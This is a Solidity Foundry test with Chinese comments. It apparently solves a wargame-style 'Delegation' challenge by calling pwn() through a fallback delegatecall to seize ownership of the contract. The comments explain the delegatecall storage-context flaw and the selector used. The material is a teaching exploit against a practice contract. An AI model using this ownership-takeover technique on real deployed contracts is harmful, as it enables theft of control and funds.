// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/Delegation.sol";

contract DelegationTest is Test {

    address attacker;
    Delegate delegate;
    Delegation delegation;

    function setUp() public {
        delegate = new Delegate(address(0x789));
        delegation = new Delegation(address(delegate));

        attacker = address(0x123);
    }

    function test_delegatecallPwn() public {
        vm.startPrank(attacker);
        console.log(delegate.owner()); // 0x0000000000000000000000000000000000000789
        console.log(delegation.owner()); // address(this)
        (bool success, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, 'call pwn() failed.');

        console.log(delegation.owner()); // 0x0000000000000000000000000000000000000123

        assertEq(attacker, delegation.owner());
        vm.stopPrank();
    }
}

// Fallback函数
// Delegation合约中的fallback()函数使用delegatecall来调用Delegate合约中的函数，并使用相同的数据负载。这允许Delegation合约的状态改变，如果这些函数存在于Delegate合约中。

// 函数选择器
// fallback函数中的delegatecall将使用从msg.data中提取的函数选择器。pwn()函数的选择器是0xdd365b8b，可以通过web3.eth.abi.encodeFunctionSignature("pwn()")获得。

// Delegatecall上下文
// 当执行delegatecall时，它在Delegation合约的上下文中运行Delegate合约的代码，从而允许更改Delegation合约的owner变量。

// 所有权转移
// 通过发送包含正确数据负载的交易，Delegation合约的owner将被设置为msg.sender，从而有效地转移所有权。
// 这样，你可以通过利用Delegation合约中的fallback函数和对Delegate合约中pwn()函数的delegatecall，接管Delegation合约的控制权。

